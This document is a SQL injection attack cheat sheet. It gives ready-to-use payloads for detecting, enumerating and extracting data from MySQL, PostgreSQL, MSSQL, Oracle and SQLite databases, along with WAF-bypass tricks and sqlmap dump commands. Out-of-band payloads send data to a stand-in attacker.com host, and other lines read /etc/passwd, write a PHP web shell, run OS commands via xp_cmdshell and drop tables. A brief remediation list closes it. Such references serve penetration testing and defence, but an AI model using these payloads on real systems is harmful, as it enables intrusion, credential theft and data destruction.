# SQL Injection — Complete Attack Guide

## 1. Detection

### 1.1 Error-Based Detection
```
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' UNION SELECT NULL--
```

**Indicators:** SQL syntax error, database version leak, different response length

### 1.2 Boolean-Based Blind
```
' AND 1=1--  → True condition
' AND 1=2--  → False condition
```
**Indicator:** Response differs between true/false conditions (length, content, status)

### 1.3 Time-Based Blind
```
MySQL:    ' AND SLEEP(5)--
PostgreSQL: '; SELECT pg_sleep(5)--
MSSQL:    '; WAITFOR DELAY '0:0:5'--
Oracle:   ' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
SQLite:   ' AND 1=randomblob(500000000)--
```

### 1.4 Out-of-Band (OOB)
```
MySQL:    ' AND (SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a')))--
MSSQL:    '; EXEC master..xp_dirtree '\\attacker.com\a'--
Oracle:   ' AND UTL_HTTP.REQUEST('http://attacker.com/')--
```

## 2. Enumeration

### 2.1 Database Version
```sql
MySQL:      ' UNION SELECT version(),2--
PostgreSQL: ' UNION SELECT version(),2--
MSSQL:      ' UNION SELECT @@version,2--
Oracle:     ' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
SQLite:     ' UNION SELECT sqlite_version(),2--
```

### 2.2 Database Names
```sql
MySQL:      ' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata--
PostgreSQL: ' UNION SELECT string_agg(datname,','),2 FROM pg_database--
MSSQL:      ' UNION SELECT name,2 FROM master..sysdatabases--
Oracle:     ' UNION SELECT owner,2 FROM all_tables WHERE ROWNUM=1--
```

### 2.3 Table Enumeration
```sql
MySQL:      ' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--
PostgreSQL: ' UNION SELECT string_agg(tablename,','),2 FROM pg_tables WHERE schemaname='public'--
MSSQL:      ' UNION SELECT STRING_AGG(name,','),2 FROM sysobjects WHERE xtype='U'--
```

### 2.4 Column Enumeration
```sql
MySQL:      ' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'--
PostgreSQL: ' UNION SELECT string_agg(column_name,','),2 FROM information_schema.columns WHERE table_name='users'--
```

### 2.5 Data Extraction
```sql
MySQL:      ' UNION SELECT group_concat(username,0x3a,password),2 FROM users--
PostgreSQL: ' UNION SELECT string_agg(username||':'||password,','),2 FROM users--
MSSQL:      ' UNION SELECT STRING_AGG(username+':'+password,','),2 FROM users--
```

## 3. WAF Bypass Techniques

### 3.1 Comment Bypass
```sql
UN/**/ION SEL/**/ECT 1,2,3--
/*!50000UNION*//*!50000SELECT*/1,2,3--
/*!UNION*//*!SELECT*/1,2,3--
```

### 3.2 Case Variation
```sql
uNiOn SeLeCt 1,2,3--
UNion SELect 1,2,3--
```

### 3.3 Encoding Bypass
```sql
%55NION %53ELECT 1,2,3--     # URL encoding
uni%6fn se%6cect 1,2,3--     # Partial URL encoding
%E6%9D%A1%E4%BB%B6           # Unicode
```

### 3.4 Double Encoding
```sql
%2527%20OR%201%3D1--         # Double URL encoding
```

### 3.5 Chunked Transfer
```
Transfer-Encoding: chunked
Body: 1\r\nA\r\n0\r\n\r\n (with CL.TE smuggling)
```

### 3.6 HTTP Parameter Pollution
```
?id=1&id=1' UNION SELECT 1,2,3--
```

### 3.7 JSON Injection
```json
{"username": "' OR 1=1--", "password": "test"}
```

### 3.8 XML Injection (XXE + SQLi)
```xml
<username>' OR 1=1--</username>
```

## 4. Database-Specific Techniques

### 4.1 MySQL
```sql
-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd'),2--

-- Write file
' UNION SELECT '<?php system($_GET["cmd"]);?>',2 INTO OUTFILE '/var/www/shell.php'--

-- Stacked queries
'; DROP TABLE users;--

-- Subquery
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x) = 3--
```

### 4.2 PostgreSQL
```sql
-- Read file
' UNION SELECT pg_read_file('/etc/passwd'),2--

-- Command execution (with superuser)
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--

-- Large object
' SELECT lo_import('/etc/passwd'); SELECT lo_get(1);--
```

### 4.3 MSSQL
```sql
-- Command execution
'; EXEC xp_cmdshell 'whoami';--

-- Linked server
'; EXEC sp_linkedservers;--

-- Read file
'; EXEC xp_cmdshell 'type C:\Windows\win.ini';--
```

### 4.4 SQLite
```sql
-- Read file (SQLite doesn't have file I/O by default)
' UNION SELECT sql,2 FROM sqlite_master--

-- Attach database
' ATTACH DATABASE '/var/www/config.php' AS hack;--
```

## 5. Advanced Techniques

### 5.1 Second-Order SQLi
```
1. Inject payload during registration: admin'--
2. Payload stored in database
3. Triggered when admin logs in or profile is queried
```

### 5.2 GraphQL SQLi
```graphql
query { user(name: "' OR 1=1--") { id, email } }
```

### 5.3 Header-Based SQLi
```
X-Forwarded-For: ' OR 1=1--
User-Agent: ' OR 1=1--
Referer: ' OR 1=1--
Cookie: session=' OR 1=1--
```

### 5.4 JSON Body SQLi
```json
{"id": "1' OR 1=1--"}
{"filter": {"name": "' OR 1=1--"}}
```

## 6. Automation

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target/page?id=1" --batch

# POST data
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# Cookie-based
sqlmap -u "http://target/dashboard" --cookie="session=abc" --batch

# With tamper scripts
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --batch

# Full enumeration
sqlmap -u "http://target/?id=1" --dbs --tables --columns --dump --batch
```

## 7. Remediation

1. **Parameterized queries / Prepared statements** — NEVER concatenate user input into SQL
2. **ORM with built-in protection** — Django ORM, SQLAlchemy, Prisma
3. **Input validation** — Whitelist allowed characters
4. **Least privilege** — Database user should have minimal permissions
5. **WAF** — Additional layer (not primary defense)
6. **Error handling** — Never expose database errors to users
